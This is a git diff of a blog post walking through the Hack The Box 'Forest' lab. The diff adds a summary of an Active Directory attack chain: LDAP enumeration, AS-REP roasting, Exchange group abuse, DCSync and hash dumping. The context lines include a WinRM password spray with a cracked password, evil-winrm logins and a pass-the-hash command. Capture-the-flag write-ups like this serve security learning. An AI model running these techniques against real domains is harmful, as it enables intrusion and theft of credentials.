@@ -2,7 +2,7 @@
 title: "Forest Walkthrough(HTB)"
 date: 2025-03-07
 draft: false
-description: "a description"
+description: "Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes."
 tags: ["Easy", "windows","HTB", "hacking", "Active Directory", "walkthrough"]
 series: ["Hack The Box"]
 series_order: "1"
@@ -271,7 +271,7 @@ WINRM       10.10.10.161    5985   FOREST           [-] htb.local\andy:s3rvice
 WINRM       10.10.10.161    5985   FOREST           [-] htb.local\mark:s3rvice
 WINRM       10.10.10.161    5985   FOREST           [-] htb.local\santi:s3rvice
 ```
-- Got the user flag
+- Got the {{< keyword >}} User flag {{< /keyword >}}
 ```
 ❯ evil-winrm -u svc-alfresco -p s3rvice -i htb.local                            
                                         
@@ -411,7 +411,7 @@ EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 
 ```
-- We got everything we can, "we" successfully acheived a hacker's dream, Logged in using winrm as administrator and got the root flag
+- We got everything we can, "we" successfully acheived a hacker's dream, Logged in using winrm as administrator and got the {{< keyword >}} Root flag {{< /keyword >}} 
 ```
 ❯ evil-winrm -u administrator -H 32693b<hidden> -i htb.local                                  
                                         
